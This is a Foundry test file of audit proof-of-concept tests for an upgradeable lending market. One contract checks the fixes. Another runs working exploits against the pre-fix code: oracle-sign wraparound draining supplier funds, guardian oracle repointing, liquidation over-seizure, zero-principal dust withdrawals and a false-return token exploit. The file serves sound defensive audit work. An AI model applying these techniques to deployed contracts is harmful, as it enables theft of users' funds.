// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

import {LendingMarket} from "../src/LendingMarket.sol";
import {OriginalLendingMarket} from "./original/OriginalLendingMarket.sol";
import {TransparentUpgradeableProxy} from "../src/TransparentUpgradeableProxy.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {MockOracle} from "../src/mocks/MockOracle.sol";

/**
 * @notice Per-finding PoCs, keyed to FINDINGS.md IDs (C1..I2).
 *
 *         Two conventions:
 *           - Tests named after Fix-disposition findings assert the CORRECT behavior:
 *             they FAIL against the current LendingMarket (which is the proof the
 *             finding is valid) and PASS once the fix lands.
 *           - Tests tagged "documentation" pin down behavior we are deliberately not
 *             changing (Document disposition). They pass before and after; they exist
 *             so the finding is executable evidence, not just prose.
 */
contract PoCTests is Test {
    uint256 internal constant FACTOR = 1e18;
    uint256 internal constant RATE = uint256(0.05e18) / 365 days;

    /// @dev Must stay in sync with the staleness bound the fix introduces in
    ///      LendingMarket.getPrice() (FINDINGS H2). 1 hour tracks the usual
    ///      heartbeats; warps below push past any reasonable bound.
    uint256 internal constant EXPECTED_MAX_STALENESS = 1 hours;

    address internal admin = makeAddr("admin");
    address internal guardian = makeAddr("guardian");
    address internal supplier = makeAddr("supplier");
    address internal borrower = makeAddr("borrower");
    address internal liquidator = makeAddr("liquidator");

    MockERC20 internal base;
    MockERC20 internal weth;
    MockOracle internal oracle;
    LendingMarket internal market;

    function setUp() public {
        base = new MockERC20("Base USD", "bUSD", 18);
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        oracle = new MockOracle(2_000e18);
        market = _deployMarket(address(base), address(weth), address(oracle));

        base.mint(supplier, 1_000_000e18);
        vm.startPrank(supplier);
        base.approve(address(market), type(uint256).max);
        market.supply(1_000_000e18);
        vm.stopPrank();
    }

    function _deployMarket(address base_, address collateral_, address oracle_) internal returns (LendingMarket) {
        LendingMarket impl = new LendingMarket();
        bytes memory initData = abi.encodeCall(
            LendingMarket.initialize,
            (admin, guardian, oracle_, base_, collateral_, 0.80e18, 1.10e18, RATE)
        );
        return LendingMarket(address(new TransparentUpgradeableProxy(address(impl), admin, initData)));
    }

    function _postCollateral(address who, uint256 amount) internal {
        weth.mint(who, amount);
        vm.startPrank(who);
        weth.approve(address(market), type(uint256).max);
        market.supplyCollateral(amount);
        vm.stopPrank();
    }

    /// @dev Pushes both indices well past 1e18 so dust-sized amounts compute to
    ///      zero principal on the unfixed contract. Oracle is refreshed after the
    ///      warp so priced calls still see a live answer (FINDINGS H2 note).
    function _growIndices() internal {
        _postCollateral(borrower, 10_000e18);
        vm.prank(borrower);
        market.borrow(900_000e18);

        vm.warp(block.timestamp + 1000 * 365 days);
        market.accrueInterest();
        oracle.setPrice(2_000e18);
    }

    // ---------------------------------------------------------------------------------------
    // C1 — Critical — liquidation seizes collateral in base-asset units
    //
    // seizeAmount = repayAmount * incentive / 1e18 prices repaid base AS collateral.
    // Correct: convert at the oracle price first -> repay*incentive/price units of
    // collateral. On the unfixed contract repaying 10 base seizes the entire 10 WETH
    // collateral balance instead of ~0.0061 WETH.
    // ---------------------------------------------------------------------------------------
    function test_C1_liquidateSeizesPricedCollateral() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(15_000e18);

        oracle.setPrice(1_800e18); // power 14,400 < debt 15,000
        assertFalse(market.isHealthy(borrower));

        base.mint(liquidator, 10e18);
        vm.startPrank(liquidator);
        base.approve(address(market), type(uint256).max);
        market.liquidate(borrower, 10e18);
        vm.stopPrank();

        // 10 base repaid * 1.10 incentive / 1800 base-per-WETH = 0.006111.. WETH
        uint256 expected = 6111111111111111;
        assertApproxEqAbs(weth.balanceOf(liquidator), expected, 10);
    }

    // ---------------------------------------------------------------------------------------
    // C2 — Critical — oracle answer used without validation
    //
    // getPrice() casts the signed answer straight to uint256. A negative answer wraps
    // to ~1.15e77 (dust collateral -> infinite borrowing power -> total base drain);
    // zero collapses every position's borrowing power. Correct: revert on answer <= 0.
    // ---------------------------------------------------------------------------------------
    function test_C2_getPriceRejectsNonPositiveAnswers() public {
        oracle.setPrice(-1);
        vm.expectRevert();
        market.getPrice();

        oracle.setPrice(int256(-2000e18));
        vm.expectRevert();
        market.getPrice();

        oracle.setPrice(0);
        vm.expectRevert();
        market.getPrice();
    }

    /// Same finding, one hop downstream: a wrapped-negative price must not be spendable.
    function test_C2_negativeAnswerCannotBackBorrow() public {
        _postCollateral(borrower, 1); // 1 wei of collateral
        oracle.setPrice(-1);

        vm.prank(borrower);
        vm.expectRevert();
        market.borrow(1_000_000e18);
    }

    // ---------------------------------------------------------------------------------------
    // H1 — High — pause guardian can repoint the pricing oracle
    //
    // setOracle is onlyGuardian, and onlyGuardian admits the guardian key. The README's
    // trust model limits that warm key to stopping the market, yet it can install any
    // price feed and grant arbitrary borrowing power. Correct: admin only.
    // ---------------------------------------------------------------------------------------
    function test_H1_guardianCannotSetOracle() public {
        MockOracle inflated = new MockOracle(1_000_000e18);

        vm.prank(guardian);
        vm.expectRevert();
        market.setOracle(address(inflated));
    }

    /// Specification counterpart: the admin (timelock) retains oracle control.
    function test_H1_adminCanSetOracle() public {
        MockOracle replacement = new MockOracle(2_100e18);

        vm.prank(admin);
        market.setOracle(address(replacement));

        assertEq(address(market.oracle()), address(replacement));
    }

    // ---------------------------------------------------------------------------------------
    // H2 — High — oracle staleness never checked
    //
    // latestRoundData's updatedAt is discarded, so a stalled feed keeps pricing
    // positions forever. Correct: revert once block.timestamp - updatedAt exceeds
    // the market's staleness bound (EXPECTED_MAX_STALENESS above).
    // ---------------------------------------------------------------------------------------
    function test_H2_staleAnswerReverts() public {
        vm.warp(block.timestamp + EXPECTED_MAX_STALENESS + 1);

        vm.expectRevert();
        market.getPrice();
    }

    /// Same finding at the spend path: stale prices must not originate debt.
    function test_H2_staleAnswerCannotBackBorrow() public {
        _postCollateral(borrower, 10e18);

        vm.warp(block.timestamp + EXPECTED_MAX_STALENESS + 1);

        vm.prank(borrower);
        vm.expectRevert();
        market.borrow(1e18);
    }

    /// Boundary: a feed that just updated must still price normally.
    function test_H2_freshAnswerStillPrices() public {
        oracle.setPrice(2_000e18);
        assertEq(market.getPrice(), 2_000e18);
    }

    // ---------------------------------------------------------------------------------------
    // M1 — Medium — withdrawCollateral checks health against stale debt
    //
    // The only risk path that skips accrueInterest(). Debt 15,000 vs power 15,000
    // passes the stale check exactly; after a 365-day accrual the debt is 15,750 and
    // the same withdrawal is underwater. Correct: accrue first, then check -> revert.
    // ---------------------------------------------------------------------------------------
    function test_M1_withdrawCollateralRevertsAfterFreshAccrual() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(15_000e18);

        vm.warp(block.timestamp + 365 days);
        oracle.setPrice(2_000e18); // refresh feed; price itself unchanged

        vm.prank(borrower);
        vm.expectRevert("would be undercollateralized");
        market.withdrawCollateral(0.625e18);
    }

    // ---------------------------------------------------------------------------------------
    // M2 — Medium — principal rounding to zero (fuzzed)
    //
    // principal = amount * 1e18 / index floors. Once index > 1e18, dust amounts map
    // to zero principal: a stranger can withdraw base for free, and a borrower can
    // take base while recording zero debt. Correct: round UP when burning claims or
    // creating debt (or revert on zero-principal nonzero amounts).
    //
    // Fuzz domain: [1, (index-1)/1e18] — every value provably floors to 0 principal
    // on the unfixed contract.
    // ---------------------------------------------------------------------------------------
    function testFuzz_M2_nonSupplierCannotWithdrawDust(uint256 amount) public {
        _growIndices();
        uint256 ceiling = (market.baseSupplyIndex() - 1) / FACTOR;
        amount = bound(amount, 1, ceiling);

        address nobody = makeAddr("nobody"); // supplyPrincipal == 0
        vm.prank(nobody);
        vm.expectRevert();
        market.withdraw(amount);
    }

    function testFuzz_M2_dustBorrowRecordsNonZeroPrincipal(uint256 amount) public {
        _growIndices();
        uint256 ceiling = (market.baseBorrowIndex() - 1) / FACTOR;
        amount = bound(amount, 1, ceiling);

        address dustBorrower = makeAddr("dustBorrower");
        _postCollateral(dustBorrower, 10e18);

        vm.prank(dustBorrower);
        market.borrow(amount);

        assertGt(market.borrowPrincipal(dustBorrower), 0);
    }

    // ---------------------------------------------------------------------------------------
    // M3 — Medium — token transfer semantics unchecked
    //
    // supply() credits principal for the requested amount while ignoring
    // transferFrom's return value. A token that returns false instead of reverting
    // deposits nothing yet is fully credited — claims exceed backing. Correct:
    // require every token call to return true (or use balance-delta accounting).
    // ---------------------------------------------------------------------------------------
    function test_M3_falseReturnTokenCannotBeCredited() public {
        FalseReturnERC20 bad = new FalseReturnERC20();
        LendingMarket m = _deployMarket(address(bad), address(weth), address(oracle));

        bad.mint(supplier, 1_000e18);
        vm.startPrank(supplier);
        bad.approve(address(m), type(uint256).max);
        vm.expectRevert();
        m.supply(1_000e18);
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------
    // L1 — Low — surplus accrues to no one and cannot be swept (documentation)
    //
    // Any base that lands in the contract without principal behind it — index floor
    // dust or a mistaken direct transfer — has no exit: there is no sweep function
    // anywhere. (The "interest accrued while supply sat empty" variant is
    // unreachable: suppliers can't fully exit while borrows are open, so
    // suppliesBefore == 0 only holds when nothing accrues anyway.) The mint stands
    // in for accumulated surplus; the withdrawal proves claims can't reach it.
    // ---------------------------------------------------------------------------------------
    function test_L1_trappedSurplusIsUnclaimable() public {
        base.mint(address(market), 123e18); // accumulated surplus / stray transfer

        uint256 claimable = market.supplyBalanceOf(supplier);
        vm.prank(supplier);
        market.withdraw(claimable); // every legitimate claim exits

        // The surplus stays behind and nothing in the contract can move it.
        assertGe(base.balanceOf(address(market)), 123e18);
    }

    // ---------------------------------------------------------------------------------------
    // L2 — Low — full repay leaves residual dust debt
    //
    // repay caps amount to a floor-divided PV, then burns a floor-divided principal.
    // The account keeps ~1 wei of borrowPrincipal that keeps accruing. Correct: when
    // the payment covers the full balance, burn the stored principal outright.
    // ---------------------------------------------------------------------------------------
    function test_L2_fullRepayBurnsAllPrincipal() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        // +1 wei keeps principal off the 1e18 grid, so the double floor-division
        // in owed -> principal deterministically leaves residue on unfixed code.
        market.borrow(5_000e18 + 1);

        vm.warp(block.timestamp + 31 days + 7 hours);
        market.accrueInterest();

        vm.startPrank(borrower);
        base.approve(address(market), type(uint256).max);
        base.mint(borrower, market.borrowBalanceOf(borrower));
        market.repay(type(uint256).max);
        vm.stopPrank();

        assertEq(market.borrowPrincipal(borrower), 0);
    }

    // ---------------------------------------------------------------------------------------
    // L3 — Low — seize cap can overcharge the liquidator
    //
    // seize is capped at collateralBalance but full repayAmount is still pulled.
    // Correct (post-C1): scale the repayment to the collateral actually seized —
    // 1 WETH at 1,500 base / 1.10 incentive = 1,363.63.. base, not the full 1,500.
    // ---------------------------------------------------------------------------------------
    function test_L3_cappedSeizeScalesRepay() public {
        _postCollateral(borrower, 1e18); // thin position
        vm.prank(borrower);
        market.borrow(1_500e18);

        oracle.setPrice(1_500e18); // power 1,200 < debt 1,500
        assertFalse(market.isHealthy(borrower));

        base.mint(liquidator, 1_500e18);
        vm.startPrank(liquidator);
        base.approve(address(market), type(uint256).max);
        market.liquidate(borrower, 1_500e18);
        vm.stopPrank();

        assertEq(weth.balanceOf(liquidator), 1e18); // all collateral seized
        uint256 expected = 1363636363636363636363; // 1 * 1500 / 1.10
        assertApproxEqAbs(1_500e18 - base.balanceOf(liquidator), expected, 10);
    }

    // ---------------------------------------------------------------------------------------
    // L4 — Low — self-liquidation permitted (documentation)
    //
    // A borrower may liquidate their own unhealthy position. We keep this behavior;
    // the test pins it so a future "fix" can't silently break the convention.
    // On the unfixed contract it also composes with C1 into free collateral recovery.
    // ---------------------------------------------------------------------------------------
    function test_L4_selfLiquidationPermitted() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(15_000e18);

        oracle.setPrice(1_800e18);
        assertFalse(market.isHealthy(borrower));

        base.mint(borrower, 100e18);
        vm.startPrank(borrower);
        base.approve(address(market), type(uint256).max);
        market.liquidate(borrower, 100e18); // must not revert solely on self-liquidation
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------
    // L5 — Low — initialize accepts zero addresses
    //
    // A zero oracle deploys a market whose priced paths revert forever; a zero admin
    // locks every admin function. Correct: reject zero addresses in initialize.
    // ---------------------------------------------------------------------------------------
    function test_L5_initializeRejectsZeroAddresses() public {
        // initialize() is called directly — expectRevert does not reliably arm on
        // `new` expressions (forge routes them through deployCode), and the checks
        // under test live in the function, not the proxy.
        LendingMarket impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(admin, guardian, address(0), address(base), address(weth), 0.80e18, 1.10e18, RATE);

        impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(address(0), guardian, address(oracle), address(base), address(weth), 0.80e18, 1.10e18, RATE);

        impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(admin, guardian, address(oracle), address(0), address(weth), 0.80e18, 1.10e18, RATE);

        impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(admin, guardian, address(oracle), address(base), address(0), 0.80e18, 1.10e18, RATE);
    }

    /// Same finding, risk-parameter variant: collateralFactor must be in (0, FACTOR]
    /// and liquidationIncentive at or above par — the same bounds setParameters
    /// enforces, so init can't wire a market the admin could never set later.
    function test_L5_initializeRejectsOutOfBoundsParameters() public {
        LendingMarket impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(admin, guardian, address(oracle), address(base), address(weth), 0, 1.10e18, RATE);

        impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(admin, guardian, address(oracle), address(base), address(weth), 1.01e18, 1.10e18, RATE);

        impl = new LendingMarket();
        vm.expectRevert();
        impl.initialize(admin, guardian, address(oracle), address(base), address(weth), 0.80e18, 0.99e18, RATE);
    }

    // ---------------------------------------------------------------------------------------
    // I1 — Info — interest accrues through a pause while liquidation is frozen
    // (documentation)
    //
    // Pausing stops liquidate but not the borrow index: pause duration converts
    // healthy-ish positions into unliquidatable unhealthy ones. Defensible, but it
    // must be a stated property of the incident playbook, not an accident.
    // ---------------------------------------------------------------------------------------
    function test_I1_pauseGrowsDebtWhileLiquidationFrozen() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(15_900e18);

        vm.prank(guardian);
        market.setPaused(true);

        vm.warp(block.timestamp + 365 days);
        oracle.setPrice(2_000e18); // feed stays fresh during the incident
        market.accrueInterest();   // accrual itself is (correctly) unpaused

        assertFalse(market.isHealthy(borrower)); // ~16,695 debt vs 16,000 power

        base.mint(liquidator, 100e18);
        vm.startPrank(liquidator);
        base.approve(address(market), type(uint256).max);
        vm.expectRevert("paused");
        market.liquidate(borrower, 100e18);
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------------------------
    // I2 — Info — no reserve factor: suppliers capture 100% of borrow interest
    // (documentation)
    //
    // accruedToSuppliers = borrowsBefore * interest credits every wei of borrow
    // interest to suppliers; the protocol keeps nothing and builds no bad-debt
    // buffer. Pinned here so the zero-reserve design is explicit.
    // ---------------------------------------------------------------------------------------
    function test_I2_suppliersCaptureAllBorrowInterest() public {
        _postCollateral(borrower, 10_000e18);
        vm.prank(borrower);
        market.borrow(100_000e18);

        uint256 borrowBefore = market.borrowBalanceOf(borrower);
        uint256 supplyBefore = market.supplyBalanceOf(supplier);

        vm.warp(block.timestamp + 365 days);
        market.accrueInterest();

        uint256 borrowDelta = market.borrowBalanceOf(borrower) - borrowBefore;
        uint256 supplyDelta = market.supplyBalanceOf(supplier) - supplyBefore;

        // Everything borrowers accrued was credited to suppliers, bar floor dust.
        assertApproxEqRel(supplyDelta, borrowDelta, 1e15);
        assertGt(borrowDelta, 0);
    }
}

/**
 * @notice The exploit side of the PoCs: the same findings exercised against the
 *         frozen pre-fix implementation in ./original/OriginalLendingMarket.sol.
 *
 *         Every test here asserts that the exploit SUCCEEDS — a green run is the
 *         standing proof that each finding in FINDINGS.md was real on the code
 *         that shipped. Pair each test with its same-ID counterpart in PoCTests:
 *         that one fails here and passes there; this one passes here.
 */
contract OriginalExploitTest is Test {
    uint256 internal constant FACTOR = 1e18;
    uint256 internal constant RATE = uint256(0.05e18) / 365 days;

    address internal admin = makeAddr("admin");
    address internal guardian = makeAddr("guardian");
    address internal supplier = makeAddr("supplier");
    address internal borrower = makeAddr("borrower");
    address internal liquidator = makeAddr("liquidator");

    MockERC20 internal base;
    MockERC20 internal weth;
    MockOracle internal oracle;
    OriginalLendingMarket internal market;

    function setUp() public {
        base = new MockERC20("Base USD", "bUSD", 18);
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        oracle = new MockOracle(2_000e18);
        market = _deployMarket(address(base), address(weth), address(oracle));

        base.mint(supplier, 1_000_000e18);
        vm.startPrank(supplier);
        base.approve(address(market), type(uint256).max);
        market.supply(1_000_000e18);
        vm.stopPrank();
    }

    function _deployMarket(address base_, address collateral_, address oracle_)
        internal
        returns (OriginalLendingMarket)
    {
        OriginalLendingMarket impl = new OriginalLendingMarket();
        bytes memory initData = abi.encodeCall(
            OriginalLendingMarket.initialize,
            (admin, guardian, oracle_, base_, collateral_, 0.80e18, 1.10e18, RATE)
        );
        return
            OriginalLendingMarket(address(new TransparentUpgradeableProxy(address(impl), admin, initData)));
    }

    function _postCollateral(address who, uint256 amount) internal {
        weth.mint(who, amount);
        vm.startPrank(who);
        weth.approve(address(market), type(uint256).max);
        market.supplyCollateral(amount);
        vm.stopPrank();
    }

    /// @dev Same index-growth trick as the fix side; the original ignores feed
    ///      staleness, so no oracle refresh is needed after the warp.
    function _growIndices() internal {
        _postCollateral(borrower, 10_000e18);
        vm.prank(borrower);
        market.borrow(900_000e18);

        vm.warp(block.timestamp + 1000 * 365 days);
        market.accrueInterest();
    }

    // C1 — repaying 10 base seizes the borrower's ENTIRE 10 WETH balance (~18,000
    // base of value) because seize math never divides by the oracle price.
    function test_C1_liquidateSeizesFullCollateralForDustRepay() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(15_000e18);

        oracle.setPrice(1_800e18);
        assertFalse(market.isHealthy(borrower));

        base.mint(liquidator, 10e18);
        vm.startPrank(liquidator);
        base.approve(address(market), type(uint256).max);
        market.liquidate(borrower, 10e18);
        vm.stopPrank();

        assertEq(weth.balanceOf(liquidator), 10e18); // everything, for 10 base
    }

    // C2 — a negative feed answer wraps to ~1.15e77; 1 wei of collateral backs a
    // borrow of the entire supplier base.
    function test_C2_negativeAnswerGrantsUnboundedBorrow() public {
        _postCollateral(borrower, 1); // 1 wei
        oracle.setPrice(-1);

        vm.prank(borrower);
        market.borrow(1_000_000e18);

        assertEq(base.balanceOf(borrower), 1_000_000e18);
    }

    // H1 — the warm guardian key, documented as stop-only, repoints the pricing
    // source and mints borrowing power out of thin air.
    function test_H1_guardianRepointsOracleAndDrains() public {
        _postCollateral(borrower, 1e18);
        MockOracle inflated = new MockOracle(1_000_000e18);

        vm.prank(guardian);
        market.setOracle(address(inflated));
        assertEq(address(market.oracle()), address(inflated));

        vm.prank(borrower);
        market.borrow(100_000e18); // 1 WETH of "collateral" backs 100k
        assertEq(base.balanceOf(borrower), 100_000e18);
    }

    // H2 — a feed silent for over a year still prices new debt.
    function test_H2_staleAnswerStillOriginatesDebt() public {
        _postCollateral(borrower, 10e18);
        (, , , uint256 lastUpdate, ) = oracle.latestRoundData();

        vm.warp(block.timestamp + 366 days);

        vm.prank(borrower);
        market.borrow(15_000e18);

        assertGe(block.timestamp - lastUpdate, 366 days);
        assertEq(base.balanceOf(borrower), 15_000e18);
    }

    // M1 — with 5% accrual skipped, withdrawing 0.625 WETH passes the stale health
    // check and leaves the position underwater once interest is actually booked.
    function test_M1_staleDebtPermitsCollateralWithdrawal() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(15_000e18);

        vm.warp(block.timestamp + 365 days);
        vm.prank(borrower);
        market.withdrawCollateral(0.625e18); // succeeds on 15,000 stale debt

        market.accrueInterest();
        assertFalse(market.isHealthy(borrower)); // 15,750 real debt vs 15,000 power
    }

    // M2 — dust amounts floor to zero principal: a stranger withdraws base for
    // free, and a borrower takes base while recording no debt. Fuzzed over the
    // whole dust domain [1, (index-1)/1e18].
    function testFuzz_M2_nonSupplierWithdrawsDustFree(uint256 amount) public {
        _growIndices();
        uint256 ceiling = (market.baseSupplyIndex() - 1) / FACTOR;
        amount = bound(amount, 1, ceiling);

        address nobody = makeAddr("nobody");
        vm.prank(nobody);
        market.withdraw(amount); // burns zero principal, still pays out

        assertEq(market.supplyPrincipal(nobody), 0);
        assertEq(base.balanceOf(nobody), amount);
    }

    function testFuzz_M2_dustBorrowRecordsZeroDebt(uint256 amount) public {
        _growIndices();
        uint256 ceiling = (market.baseBorrowIndex() - 1) / FACTOR;
        amount = bound(amount, 1, ceiling);

        address dustBorrower = makeAddr("dustBorrower");
        _postCollateral(dustBorrower, 10e18);

        vm.prank(dustBorrower);
        market.borrow(amount);

        assertEq(market.borrowPrincipal(dustBorrower), 0); // free base, no debt
        assertEq(base.balanceOf(dustBorrower), amount);
    }

    // M3 — a token whose transferFrom returns false without moving anything is
    // still fully credited as principal: claims exceed backing with no revert.
    function test_M3_falseReturnTokenIsCredited() public {
        FalseReturnERC20 bad = new FalseReturnERC20();
        OriginalLendingMarket m = _deployMarket(address(bad), address(weth), address(oracle));

        bad.mint(supplier, 1_000e18);
        vm.startPrank(supplier);
        bad.approve(address(m), type(uint256).max);
        m.supply(1_000e18); // transferFrom returned false — nothing arrived
        vm.stopPrank();

        assertEq(bad.balanceOf(address(m)), 0); // contract holds nothing
        assertEq(m.supplyPrincipal(supplier), 1_000e18); // but credits in full
    }

    // L2 — a capped full repay still leaves ~1 wei of principal accruing.
    function test_L2_fullRepayLeavesDebtDust() public {
        _postCollateral(borrower, 10e18);
        vm.prank(borrower);
        market.borrow(5_000e18 + 1); // off-1e18-grid principal -> deterministic residue

        vm.warp(block.timestamp + 31 days + 7 hours);
        market.accrueInterest();

        vm.startPrank(borrower);
        base.approve(address(market), type(uint256).max);
        base.mint(borrower, market.borrowBalanceOf(borrower));
        market.repay(type(uint256).max);
        vm.stopPrank();

        assertGt(market.borrowPrincipal(borrower), 0); // "repaid" but still owes
    }

    // L3 — seize is capped at the 1 WETH collateral balance, but the liquidator is
    // still charged the full 1,500 repay: the position becomes unliquidatable.
    function test_L3_cappedSeizeStillChargesFullRepay() public {
        _postCollateral(borrower, 1e18);
        vm.prank(borrower);
        market.borrow(1_500e18);

        oracle.setPrice(1_500e18);
        assertFalse(market.isHealthy(borrower));

        base.mint(liquidator, 1_500e18);
        vm.startPrank(liquidator);
        base.approve(address(market), type(uint256).max);
        market.liquidate(borrower, 1_500e18);
        vm.stopPrank();

        assertEq(weth.balanceOf(liquidator), 1e18); // only 1 WETH seized
        assertEq(base.balanceOf(liquidator), 0); // but the full 1,500 was taken
    }

    // L5 — initialize accepts a zero oracle (or any zero wiring) without a peep,
    // deploying a market whose priced paths are bricked from birth.
    function test_L5_zeroAddressInitializeAccepted() public {
        OriginalLendingMarket impl = new OriginalLendingMarket();

        impl.initialize(admin, guardian, address(0), address(base), address(weth), 0.80e18, 1.10e18, RATE);

        assertEq(address(impl.oracle()), address(0));
    }

    // L5 (cont.) — initialize also accepts a collateralFactor above 1e18, wiring a
    // market where borrowing power exceeds collateral value: 1 WETH of collateral
    // (2,000 base) backs a 3,000-base borrow.
    function test_L5_initializeAcceptsOutOfBoundsFactor() public {
        OriginalLendingMarket m = new OriginalLendingMarket();
        m.initialize(admin, guardian, address(oracle), address(base), address(weth), 1.5e18, 1.10e18, RATE);

        base.mint(supplier, 1_000_000e18);
        vm.startPrank(supplier);
        base.approve(address(m), type(uint256).max);
        m.supply(1_000_000e18);
        vm.stopPrank();

        weth.mint(borrower, 1e18);
        vm.startPrank(borrower);
        weth.approve(address(m), type(uint256).max);
        m.supplyCollateral(1e18);
        m.borrow(3_000e18); // undercollateralized by construction — accepted anyway
        vm.stopPrank();

        assertEq(base.balanceOf(borrower), 3_000e18);
    }
}

/// @notice ERC20 that always reports failure from transfer calls without moving
///         balances — the M3 probe for unchecked token semantics.
contract FalseReturnERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return false;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }
}
